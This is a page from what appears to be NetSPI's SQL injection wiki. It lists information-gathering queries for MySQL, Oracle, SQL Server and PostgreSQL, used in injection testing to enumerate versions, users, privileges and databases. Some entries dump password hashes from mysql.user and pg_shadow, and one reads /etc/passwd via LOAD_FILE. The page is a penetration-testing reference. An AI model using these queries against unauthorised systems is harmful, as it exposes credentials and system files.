<html>

<head>
  <meta charset="utf-8">
  <title>Information Gathering | NetSPI SQL Injection Wiki</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="../../assets/scss/index.css%3F1571409135814090317.css" />
  <link rel="stylesheet" href="../../assets/scss/nav.css%3F1571409135814090317.css" />
  <link rel="stylesheet" href="../../assets/scss/tab.css%3F1571409135814090317.css" />
  <!-- We're going to load JS up top, this makes sure all of our painting is done hopefully in one sweep  -->
  <script src="../../assets/javascripts/cash.min.js"></script>
  <script type="text/javascript" async src="../../assets/javascripts/index.js%3F1571409135814090317"></script>
  
  <script type="text/javascript" async src="../../assets/javascripts/tab.js%3F1571409135814090317"></script>
  
  <meta name="theme-color" content="#ffffff">
  <meta property="og:type" content="website" />
  <meta property="og:title" content="NetSPI SQL Injection Wiki" />
  <meta property="og:description" content="It is often valuable to gather information about any testing environment; version numbers, user accounts, and databases all help in escalating vulnerabilities." />
  <meta property="og:image" content="/assets/images/facebookCard.jpg" />
  <meta name="twitter:title" content="NetSPI SQL Injection Wiki" />
  <meta name="twitter:description" content="It is often valuable to gather information about any testing environment; version numbers, user accounts, and databases all help in escalating vulnerabilities." />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:image" content="/assets/images/twitterCard.jpg">
  <meta name="twitter:site" content="@netspi" />
  <meta name="twitter:creator" content="@netspi" />
  <meta name="description" content="It is often valuable to gather information about any testing environment; version numbers, user accounts, and databases all help in escalating vulnerabilities.">
  <meta name="keywords" content="netspi, sql injection, wiki, sqli, sql, injection, netspy, network security professionals, oracle, mysql, sqlserver, mssql, cheat sheet, cheat, sheet,information gathering, information, data, gathering">
  <link rel="author" href="https://netspi.com" />
  <link rel="shortcut icon" href="../../assets/images/favicon.ico">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
</head>

<body class="preload">
  <div class="mobile"></div>
  <div id="contentWrapper">
    <div id="topBar">
      <div class="n-nav-icon default">
        <span></span>
        <span></span>
        <span></span>
        <span></span>
      </div>
      <div id="logoContainer">
      <a href="https://netspi.com"><img src="../../assets/images/logo.png%3F1571409135814090317" /></a><br/>
      </div>
    </div>
    <div class="n-navbar default">
      <ul>
  
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/" href="../../index.html">
      
    <div>Home</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" target="_blank" rel="noopener" href="https://netspi.com">
    
    <div>About Us</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/detection" href="../../detection.html">
      
    <div>Injection Detection</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/dbmsIdentification/" href="../../dbmsIdentification/index.html">
      
    <div>DBMS Identification</div>
    </a>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/injectionTypes/" href="../../injectionTypes/index.html">
          
          <div>Injection Types</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/errorBased/" href="../../injectionTypes/errorBased/index.html">
          
          <div>Error Based Injection</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/unionBased/" href="../../injectionTypes/unionBased/index.html">
          
          <div>Union Based Injection</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/blindBased/" href="../../injectionTypes/blindBased/index.html">
          
          <div>Blind Based Injection</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/injectionTechniques/" href="../../injectionTechniques/index.html">
          
          <div>Injection Techniques</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/conditionalStatements/" href="../../injectionTechniques/conditionalStatements/index.html">
          
          <div>Conditional Statements</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/injectionPlacement/" href="../../injectionTechniques/injectionPlacement/index.html">
          
          <div>Injection Placement</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/obfuscation/" href="../../injectionTechniques/obfuscation/index.html">
          
          <div>Injection Obfuscation</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/attackQueries/" href="../index.html">
          
          <div>Attack Queries</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/informationGathering/" href="index.html">
          
          <div>Information Gathering</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/dataTargeting/" href="../dataTargeting/index.html">
          
          <div>Data Targeting</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/privilegeEscalation/" href="../privilegeEscalation/index.html">
          
          <div>Privilege Escalation</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/executingOSCommands/" href="../executingOSCommands/index.html">
          
          <div>Executing OS Commands</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/readingAndWritingFiles/" href="../readingAndWritingFiles/index.html">
          
          <div>Reading and Writing Files</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/lateralMovement/" href="../lateralMovement/index.html">
          
          <div>Lateral Movement</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/dataExfiltration/" href="../dataExfiltration.html">
          
          <div>Data Exfiltration</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/persistence/" href="../persistence/index.html">
          
          <div>Persistence</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
          <div>Misc.</div>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/contributors" href="../../misc/contributors.html">
          
          <div>Contributors</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/references/" href="../../misc/references/index.html">
          
          <div>References</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/sandboxes/" href="../../misc/sandboxes/index.html">
          
          <div>Sandboxes</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/tools/" href="../../misc/tools/index.html">
          
          <div>Tools</div>
        </a>
      </li>
      
    </ul>
  </li>
   
</ul>

    </div>
    <div id="contentContainer">
      <div id="tabs" class="tabs" data-tabs-ignore-url="false">

<input class="tabInput"  name="tabs" type="radio" id="mysql"/>
<label class="tabLabel" onClick="updateTab('mysql',false)" for="mysql">MySQL</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="information-gathering">Information Gathering</h3>


<p class="pageDescription">It is often valuable to gather information about any testing environment; version numbers, user accounts, and databases all help in escalating vulnerabilities. Below are common methods for this.</p>

<p>* Requires privileged user</p>
<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Description</th>
      <th align="left">Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Version</td>
      <td>SELECT @@version</td>
    </tr>
    <tr>
      <td>User</td>
      <td>SELECT user()<br/>SELECT system_user()</td>
    </tr>
    <tr>
      <td>Users</td>
      <td>SELECT user FROM mysql.user<br/>* SELECT Super_priv FROM mysql.user WHERE user= 'root' LIMIT 1,1</td>
    </tr>
    <tr>
      <td>Tables</td>
      <td>SELECT table_schema, table_name FROM information_schema.tables</td>
    </tr>
    <tr>
      <td>Columns</td>
      <td>SELECT table_name, column_name FROM information_schema.columns</td>
    </tr>
    <tr>
      <td>Databases</td>
      <td>SELECT schema_name FROM information_schema.schemata<br></td>
    </tr>
    <tr>
      <td>Current Database Name</td>
      <td>SELECT database()</td>
    </tr>
    <tr>
      <td>Query another Database</td>
      <td>USE [database_name]; SELECT database();<br/>SELECT [column] FROM [database_name].[table_name]</td>
    </tr>
    <tr>
      <td>Number of Columns</td>
      <td>SELECT count(*) FROM information_schema.columns WHERE table_name = '[table_name]'</td>
    </tr>
    <tr>
      <td>DBA Accounts</td>
      <td>SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'</td>
    </tr>
    <tr>
      <td>Password Hashes</td>
      <td>SELECT host, user, password FROM mysql.user</td>
    </tr>
    <tr>
      <td>Schema</td>
      <td>SELECT schema()</td>
    </tr>
    <tr>
      <td>Path to Data</td>
      <td>SELECT @@datadir</td>
    </tr>
    <tr>
      <td>Read Files</td>
      <td>* SELECT LOAD_FILE('/etc/passwd')</td>
    </tr>
  </tbody>
</table>

</div>

<input class="tabInput"  name="tabs" type="radio" id="oracle"/>
<label class="tabLabel" onClick="updateTab('oracle',false)" for="oracle">Oracle</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="information-gathering">Information Gathering</h3>


<p class="pageDescription">It is often valuable to gather information about any testing environment; version numbers, user accounts, and databases all help in escalating vulnerabilities. Below are common methods for this.</p>

<p>* Requires privileged user</p>
<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Description</th>
      <th>Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Version</td>
      <td>SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';<br>SELECT banner FROM v$version WHERE banner LIKE 'TNS%';<br>SELECT version FROM v$instance;</td>
    </tr>
    <tr>
      <td>User</td>
      <td>SELECT user FROM dual</td>
    </tr>
    <tr>
      <td>Users</td>
      <td>SELECT username FROM all_users ORDER BY username;<br>* SELECT name FROM sys.user$;</td>
    </tr>
    <tr>
      <td>Tables</td>
      <td>SELECT table_name FROM all_tables;<br>SELECT owner, table_name FROM all_tables;</td>
    </tr>
    <tr>
      <td>Tables From Column Name</td>
      <td>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';</td>
    </tr>
    <tr>
      <td>Columns</td>
      <td>SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';<br>SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';</td>
    </tr>
    <tr>
      <td>Current Database</td>
      <td>SELECT global_name FROM global_name;<br>SELECT name FROM V$DATABASE;
        <br>SELECT instance_name FROM V$INSTANCE;<br>SELECT SYS.DATABASE_NAME FROM DUAL;</td>
    </tr>
    <tr>
      <td>Databases</td>
      <td>SELECT DISTINCT owner FROM all_tables;</td>
    </tr>
    <tr>
      <td>DBA Accounts</td>
      <td>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';</td>
    </tr>
    <tr>
      <td>Privileges</td>
      <td>SELECT * FROM session_privs;(Retrieves Current Privs)<br>* SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP';<br>* SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';<br>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</td>
    </tr>
    <tr>
      <td>Location of DB Files</td>
      <td>SELECT name FROM V$DATAFILE;</td>
    </tr>
    <tr>
      <td>Hostname, IP Address</td>
      <td>SELECT UTL_INADDR.get_host_name FROM dual;<br>SELECT host_name FROM v$instance;<br>SELECT UTL_INADDR.get_host_address FROM dual; (Gets IP Address)<br>SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; (Gets Hostnames)</td>
    </tr>
  </tbody>
</table>

</div>

<input class="tabInput"  name="tabs" type="radio" id="sqlserver"/>
<label class="tabLabel" onClick="updateTab('sqlserver',false)" for="sqlserver">SQL Server</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="information-gathering">Information Gathering</h3>

<p class="pageDescription">It is often valuable to gather information about any testing environment; version numbers, user accounts, and databases all help in escalating vulnerabilities. Below are common methods for this.</p>

<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Description</th>
      <th>Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Version</td>
      <td>SELECT @@version;</td>
    </tr>
    <tr>
      <td>User</td>
      <td>SELECT user;<br>SELECT system_user;<br>SELECT user_name();<br>SELECT loginame from master..sysprocesses where spid = @@SPID</td>
    </tr>
    <tr>
      <td>Users</td>
      <td>SELECT name from master..syslogins</td>
    </tr>
    <tr>
      <td>Tables</td>
      <td>SELECT table_catalog, table_name FROM information_schema.columns</td>
    </tr>
    <tr>
      <td>Columns</td>
      <td>SELECT table_catalog, column_name FROM information_schema.columns</td>
    </tr>
    <tr>
      <td>Databases</td>
      <td>SELECT name from master..sysdatabases;</td>
    </tr>
    <tr>
      <td>Database Name</td>
      <td>SELECT db_name();</td>
    </tr>
    <tr>
      <td>Server Name</td>
      <td>SELECT @@SERVERNAME</td>
    </tr>
    <tr>
      <td>Find Stored Procedures</td>
      <td>SELECT * from master..sysobjects where name like 'sp%' order by name desc</td>
    </tr>
    <tr>
      <td>Principal Id from username</td>
      <td>SELECT SUSER_ID('sa')</td>
    </tr>
    <tr>
      <td>Username from Principal Id</td>
      <td>SELECT SUSER_NAME(1)</td>
    </tr>
    <tr>
      <td>Check if Account is Admin</td>
      <td>IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E))<br>SELECT is_srvrolemember('sysadmin');</td>
    </tr>
    <tr>
      <td>Policies</td>
      <td>SELECT p.policy_id, p.name as [PolicyName], p.condition_id, c.name as [ConditionName], c.facet, c.expression as [ConditionExpression], p.root_condition_id, p.is_enabled, p.date_created, p.date_modified, p.description, p.created_by, p.is_system,
        t.target_set_id, t.TYPE, t.type_skeleton FROM msdb.dbo.syspolicy_policies p INNER JOIN syspolicy_conditions c ON p.condition_id = c.condition_id INNER JOIN msdb.dbo.syspolicy_target_sets t ON t.object_set_id = p.object_set_id</td>
    </tr>
    <tr>
      <td>Domain User</td>
      <td><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql">https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql</a></td>
    </tr>
    <tr>
      <td>DB Audits</td>
      <td>SELECT a.audit_id, a.name as audit_name, s.name as database_specification_name, d.audit_action_name, d.major_id, OBJECT_NAME(d.major_id) as object, s.is_state_enabled, d.is_group, s.create_date, s.modify_date, d.audited_result FROM sys.server_audits
        AS a JOIN sys.database_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.database_audit_specification_details AS d ON s.database_specification_id = d.database_specification_id</td>
    </tr>
    <tr>
      <td>Server Audits</td>
      <td>SELECT audit_id, a.name as audit_name, s.name as server_specification_name, d.audit_action_name, s.is_state_enabled, d.is_group, d.audit_action_id, s.create_date, s.modify_date FROM sys.server_audits AS a JOIN sys.server_audit_specifications AS
        s ON a.audit_guid = s.audit_guid JOIN sys.server_audit_specification_details AS d ON s.server_specification_id = d.server_specification_id</td>
    </tr>
    <tr>
      <td>Query history</td>
      <td>SELECT * FROM (SELECT COALESCE(OBJECT_NAME(qt.objectid),'Ad-Hoc') AS objectname, qt.objectid as objectid, last_execution_time, execution_count, encrypted,<br/> (SELECT TOP 1 SUBSTRING(qt.TEXT,statement_start_offset / 2+1,( (CASE WHEN statement_end_offset
        = -1 THEN (LEN(CONVERT(NVARCHAR(MAX),qt.TEXT)) * 2) <br/>ELSE statement_end_offset END)- statement_start_offset) / 2+1)) AS sql_statement FROM sys.dm_exec_query_stats AS qs CROSS APPLY sys.dm_exec_sql_text(sql_handle) AS qt ) x ORDER BY execution_count
        DESC
      </td>
    </tr>
    <tr>
      <td>Enabled audit specifications</td>
      <td><a href="https://gist.github.com/nullbind/5da8b5113da007ba0111" target="_blank" rel="noopener">https://gist.github.com/nullbind/5da8b5113da007ba0111</a></td>
    </tr>
    <tr>
      <td>Local Administrators in Sysadmin Role</td>
      <td>SELECT is_srvrolemember('sysadmin','BUILTIN\Administrators')</td>
    </tr>
    <tr>
      <td>Domain users and LDAP queries via database links and openrowset</td>
      <td><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Get-SQLDomainUser-Example.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Get-SQLDomainUser-Example.sql</a></td>
    </tr>
  </tbody>
</table>

</div>

<input class="tabInput"  name="tabs" type="radio" id="postgresql"/>
<label class="tabLabel" onClick="updateTab('postgresql',false)" for="postgresql">PostgreSQL</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="information-gathering">Information Gathering</h3>

<p class="pageDescription">It is often valuable to gather information about any testing environment; version numbers, user accounts, and databases all help in escalating vulnerabilities. Below are common methods for this.</p>

<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Description</th>
      <th>Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Version</td>
      <td>SELECT version();</td>
    </tr>
    <tr>
      <td>User</td>
      <td>
	  SELECT user;<br>
	  SELECT current_user;<br>
	  SELECT session_user;<br>
	  SELECT usename FROM pg_user;<br>
	  SELECT getpgusername();
	  </td>
    </tr>
    <tr>
      <td>Users</td>
      <td>SELECT usename FROM pg_user</td>
    </tr>
    <tr>
      <td>User Password Hashes</td>
      <td>SELECT usename, passwd FROM pg_shadow</td>
    </tr>	
	<tr>
      <td>Privileges</td>
      <td>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</td>
    </tr>
	<tr>
      <td>List DBA Accounts</td>
      <td>SELECT usename FROM pg_user WHERE usesuper IS TRUE</td>
    </tr>	
	<tr>
      <td>Current Database</td>
      <td>SELECT current_database()</td>
    </tr>	
    <tr>
      <td>Databases</td>
      <td>SELECT datname FROM pg_database</td>
    </tr>
    <tr>	
    <tr>
      <td>Tables</td>
      <td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)</td>
    </tr>
    <tr>
      <td>Tables from Column Names</td>
      <td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)</td>
    </tr>	
    <tr>
      <td>Columns</td>
      <td>SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)</td>
    </tr>	
    <tr>	
      <td>Find Stored Procedures</td>
      <td>
		SELECT  proname <br>
		FROM    pg_catalog.pg_namespace n <br>
		JOIN    pg_catalog.pg_proc p <br>
		ON      pronamespace = n.oid <br>
		WHERE   nspname = 'public'; <br>
	  </td>
    </tr>	
    <tr>
		<td>Comments</td>
		<td>
		SELECT 1; –comment<br>
		SELECT /*comment*/1;<br>
		</td>
    </tr>		
    </tr>
    <tr>
      <td>Server Name</td>
      <td></td>
    </tr>
    <tr>
      <td>Host Name</td>
      <td>select inet_server_addr()</td>
    </tr>		
    <tr>
    <tr>
      <td>Listening Port</td>
      <td>select inet_server_port();</td>
    </tr>		
    <tr>
      <td>List Settings</td>
      <td>SELECT * FROM pg_settings;</td>
    </tr>			 
  </tbody>
</table>

</div>

</div>

      <div><div>
  <br/>
  <p>© 2019 Copyright by NetSPI. All rights reserved.</p>
</div>
</div>
    </div>
  </div>
</body>
</html>
